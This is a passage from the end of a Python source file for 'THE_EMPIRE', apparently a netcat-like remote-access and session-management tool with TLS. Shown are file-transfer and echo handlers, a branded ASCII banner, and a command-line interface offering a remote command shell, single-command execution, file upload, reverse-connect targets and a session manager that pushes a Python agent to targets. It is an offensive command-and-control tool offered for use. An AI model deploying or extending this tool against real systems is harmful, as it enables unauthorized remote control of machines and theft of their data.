        checksum = hashlib.sha256()
        remaining = size
        try:
            with output:
                send_packet(sock, {"ok": True})
                while remaining > 0:
                    chunk = recv_exact(sock, min(BUFFER_SIZE, remaining))
                    output.write(chunk)
                    checksum.update(chunk)
                    remaining -= len(chunk)
            send_packet(sock, {"ok": True,
                               "saved": destination,
                               "sha256": checksum.hexdigest()})
        except Exception:
            output.close()
            try: os.remove(destination)
            except OSError: pass
            raise

    def echo_session(self, client_socket):
        while True:
            message = decode_frame(recv_frame(client_socket))
            if message.strip().lower() in ("exit", "quit"):
                send_frame(client_socket, "[*] Closing connection\n")
                return
            send_frame(client_socket, f"ECHO: {message}\n")

    def receive_file(self, client_socket):
        destination = self.args.upload
        header = recv_exact(client_socket, 8)
        filesize = struct.unpack("!Q", header)[0]
        if filesize > MAX_TRANSFER:
            send_frame(client_socket, "[!] File exceeds upload limit\n")
            return
        remaining = filesize
        try:
            with open(destination, "wb") as file:
                while remaining > 0:
                    data = client_socket.recv(min(BUFFER_SIZE, remaining))
                    if not data:
                        raise ConnectionError("Upload interrupted")
                    file.write(data)
                    remaining -= len(data)
            send_frame(client_socket,
                       f"[+] Saved file: {destination}\n"
                       f"[+] Bytes received: {filesize}\n")
        except OSError as error:
            send_frame(client_socket, f"[!] Upload failed: {error}\n")


# ============================================================
# MAIN
# ============================================================
def display_startup_brand():
    import re

    try:
        from colorama import Fore, Style, init
        init(autoreset=False)
    except ImportError:
        class Fore:
            RED = "\033[31m"
            BLUE = "\033[34m"
            CYAN = "\033[36m"
            WHITE = "\033[37m"
        class Style:
            RESET_ALL = "\033[0m"
            BRIGHT = "\033[1m"

    try:
        from pyfiglet import figlet_format
    except ImportError:
        figlet_format = None

    columns = shutil.get_terminal_size(fallback=(120, 30)).columns
    enabled = bool(getattr(sys.stderr, "isatty", lambda: False)())
    red = Fore.RED if enabled else ""
    blue = Fore.BLUE if enabled else ""
    cyan = Fore.CYAN if enabled else ""
    white = Fore.WHITE if enabled else ""
    bright = Style.BRIGHT if enabled else ""
    reset = Style.RESET_ALL if enabled else ""
    strip_ansi = re.compile(r"\x1b\[[0-9;]*m")

    def center(value):
        visible = len(strip_ansi.sub("", value))
        return " " * max(0, (columns - visible) // 2) + value

    def render(text):
        if figlet_format is not None:
            return figlet_format(text, font="slant").rstrip("\n").splitlines()
        fallback = {
            "THE": [
                "  ______  __  __  ______",
                " /_  __/ / / / / / ____/",
                "  / /   / /_/ / / __/   ",
                " / /   / __  / / /___   ",
                "/_/   /_/ /_/ /_____/   ",
            ],
            "EMPIRE": [
                "    ______  __  ___   ____    ____   ____     ______",
                r"   / ____/ /  |/  /  / __ \  /  _/  / __ \   / ____/",
                "  / __/   / /|_/ /  / /_/ /  / /   / /_/ /  / __/   ",
                " / /___  / /  / /  / ____/ _/ /   / _, _/  / /___   ",
                "/_____/ /_/  /_/  /_/     /___/  /_/ |_|  /_____/   ",
            ],
            "PROTOCOL": [
                "    ____  ____  ____  ______ ____  ______ ____  __",
                r"   / __ \/ __ \/ __ \/_  __// __ \/ ____// __ \/ /",
                "  / /_/ / /_/ / / / / / /  / / / / /    / / / / / ",
                " / ____/ _, _/ /_/ / / /  / /_/ / /___/ /_/ / /___",
                r"/_/   /_/ |_|\____/ /_/   \____/\____/\____/_____ /",
            ],
        }
        return fallback.get(text, [text])

    the_lines = render("THE")
    empire_lines = render("EMPIRE")
    proto_lines = render("PROTOCOL")

    print("", file=sys.stderr)
    title_width = min(columns, 110)
    print(center(red + "═" * title_width + reset), file=sys.stderr)
    for i in range(max(len(the_lines), len(empire_lines))):
        left = the_lines[i] if i < len(the_lines) else ""
        right = empire_lines[i] if i < len(empire_lines) else ""
        print(center(red + left.rstrip() + reset + "   " + blue + right.rstrip() + reset), file=sys.stderr)
    print("", file=sys.stderr)
    for line in proto_lines:
        print(center(cyan + line + reset), file=sys.stderr)
    print(center(blue + "═" * title_width + reset), file=sys.stderr)
    print("", file=sys.stderr)

    signature_art = r"""
  ____                _           _   _
 / ___|_ __ ___  __ _| |_ ___  __| | | |__  _   _
| |   | '__/ _ \/ _` | __/ _ \/ _` | | '_ \| | | |
| |___| | |  __/ (_| | ||  __/ (_| | | |_) | |_| |
 \____|_|  \___|\__,_|\__\___|\__,_| |_.__/ \__, |
                                              |___/
  ____  _   _    _    __  __ ____     ____    _    __  __    _    ____      _
 / ___|| | | |  / \  |  \/  / ___|   / ___|  / \  |  \/  |  / \  |  _ \    / \
 \___ \| |_| | / _ \ | |\/| \___ \   \___ \ / _ \ | |\/| | / _ \ | |_) |  / _ \
  ___) |  _  |/ ___ \| |  | |___) |   ___) / ___ \| |  | |/ ___ \|  _ <  / ___ \
 |____/|_| |_/_/   \_\_|  |_|____/   |____/_/   \_\_|  |_/_/   \_\_| \_\/_/   \_\
""".strip("\n")
    for line in signature_art.splitlines():
        print(center(white + bright + line + reset), file=sys.stderr)

    signature = (white + bright + "Created By " + reset +
                 red + bright + "SHAMS" + reset + " " +
                 cyan + bright + "SAMARA" + reset)
    print(center("─" * min(columns, 70)), file=sys.stderr)
    print(center(signature), file=sys.stderr)
    print(center("─" * min(columns, 70)), file=sys.stderr)
    print("", file=sys.stderr, flush=True)


def main():
    parser = argparse.ArgumentParser(
        description="THE_EMPIRE Python TCP Client / Server (TLS 1.3 by default)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            """
            RAW TCP session manager (TLS 1.3):
              python THE_EMPIRE.py --raw -l -t 0.0.0.0 -p 8443
              THE_EMPIRE > sessions
              THE_EMPIRE > sessions -i 1
              THE_EMPIRE > sessions -u 1  (pushes a TLS Python agent)
              THE_EMPIRE > sessions -k 1
            RAW TCP client (TLS 1.3):
              python THE_EMPIRE.py --raw -t 127.0.0.1 -p 8443
            Legacy THE_EMPIRE server / client:
              python THE_EMPIRE.py -l -c
              python3 THE_EMPIRE.py -t 127.0.0.1 -p 5555
            Disable TLS (e.g. connect with plain nc):
              add --no-tls to any command
            """
        )
    )
    modes = parser.add_mutually_exclusive_group()
    modes.add_argument("-c", "--command", action="store_true",
                       help="Command shell")
    modes.add_argument("-e", "--execute", help="Execute one specified command")
    modes.add_argument("-u", "--upload", help="Receive uploaded file")
    parser.add_argument("-l", "--listen", action="store_true",
                        help="Listen for connections")
    parser.add_argument("-p", "--port", type=int, default=5555, help="TCP port")
    parser.add_argument("-t", "--target", default="127.0.0.1",
                        help="Target or bind IP address")
    parser.add_argument("-f", "--file", help="File to upload from client")
    parser.add_argument("--raw", action="store_true",
                        help="Full-duplex unframed TCP transport")
    parser.add_argument("--log", metavar="PATH",
                        help="Write connection metadata to a JSONL log")
    parser.add_argument("--raw-message", metavar="TEXT",
                        help="Send one UTF-8 message in RAW client mode")
    parser.add_argument("--raw-echo", action="store_true",
                        help="Echo received TCP bytes back in RAW listener mode")
    parser.add_argument("--upgrade-lhost", metavar="IP",
                        help="Local IP the target should reverse-connect to")
    parser.add_argument("--upgrade-lport", type=int, metavar="PORT",
                        help="Local port for the upgrade listener")
    parser.add_argument("--no-tls", action="store_true",
                        help="Disable TLS 1.3 encryption (NOT recommended)")
    args = parser.parse_args()
    if args.raw_message is not None and (not args.raw or args.listen):
        parser.error("--raw-message requires --raw client mode")
    if args.raw_echo and (not args.raw or not args.listen):
        parser.error("--raw-echo requires --raw -l")
    if args.raw and (args.command or args.execute is not None
                     or args.upload is not None or args.file):
        parser.error("--raw cannot be combined with -c, -e, -u, or -f")
    if not 1 <= args.port <= 65535:
        parser.error("Port must be between 1 and 65535")
    if args.upgrade_lport is not None and not 1 <= args.upgrade_lport <= 65535:
        parser.error("--upgrade-lport must be between 1 and 65535")

    display_startup_brand()

    if args.no_tls:
        print("[!] WARNING: TLS is DISABLED. Traffic will be in plaintext.",
              file=sys.stderr, flush=True)
    else:
        print("[+] TLS 1.3 enabled for all connections (AES-256-GCM / ChaCha20-Poly1305)",
              file=sys.stderr, flush=True)

    nc = NetCat(args)
    nc.run()


if __name__ == "__main__":
    main()